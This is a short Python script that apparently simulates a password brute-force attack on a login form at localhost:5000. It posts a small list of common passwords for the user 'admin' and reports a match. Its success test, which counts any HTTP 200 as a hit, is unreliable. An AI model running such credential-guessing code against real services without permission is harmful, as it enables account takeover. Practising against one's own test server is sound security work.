import requests


def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        try:
            # Send the post request
            r = requests.post(
                url, data={"username": username, "password": pwd}, timeout=5
            )

            # Check if the login succeeded based on your app's responses
            if "Welcome" in r.text or r.status_code == 200:
                print(f"[+] FOUND: {username}:{pwd}")
                return pwd
            else:
                print(f"[-] Failed: {pwd}")

        except requests.exceptions.ConnectionError:
            print(
                f"[!] Error: Could not connect to {url}. Is your local server running?"
            )
            return None  # Exit early if the server isn't up

    print("[-] Password not found in wordlist.")
    return None


wordlist = ["123456", "password", "admin", "letmein", "qwerty"]
brute_force_sim("http://localhost:5000/login", "admin", wordlist)
